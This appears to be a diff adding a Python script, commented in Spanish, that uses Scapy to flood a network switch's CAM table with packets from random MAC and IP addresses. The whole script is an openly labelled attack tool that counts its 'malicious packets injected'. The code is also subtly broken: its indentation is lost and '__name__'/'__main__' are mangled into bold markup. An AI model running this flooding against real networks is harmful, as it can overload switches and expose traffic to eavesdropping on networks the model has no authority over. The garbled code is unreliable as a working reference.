@@ -1,0 +1,41 @@
+#!/usr/bin/env python3
+import sys
+from scapy.all import Ether, IP, ICMP, sendp, RandMAC, RandIP
+
+def iniciar_mac_flooding(interfaz):
+print(f"[*] Iniciando inundación de tablas CAM en la interfaz: {interfaz}")
+print("[*] Monitorea el switch con: 'show mac address-table count'")
+print("[*] Presiona Ctrl+C para detener el ataque.\n")
+
+
+contador = 0
+try:
+    while True:
+        # Construye el paquete forzando MAC e IP de origen aleatorias
+        paquete = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / \\
+                  IP(src=RandIP(), dst="255.255.255.255") / \\
+                  ICMP()
+
+        # sendp envía en Capa 2 usando la interfaz indicada
+        sendp(paquete, iface=interfaz, verbose=False)
+
+        contador += 1
+        if contador % 500 == 0:
+            print(f"[+] Paquetes maliciosos inyectados: {contador}")
+
+except KeyboardInterrupt:
+    print(f"\\n[-] Ataque finalizado por el usuario. Paquetes totales: {contador}")
+    sys.exit(0)
+
+
+if **name** == "**main**":
+# IMPORTANTE: Cambia "eth0" por "e0" si el S.O. mapeó la interfaz con ese nombre literal
+interfaz_objetivo = "eth0"
+
+
+iniciar_mac_flooding(interfaz_objetivo)
+
+
+---
+
+contrarrestarlo
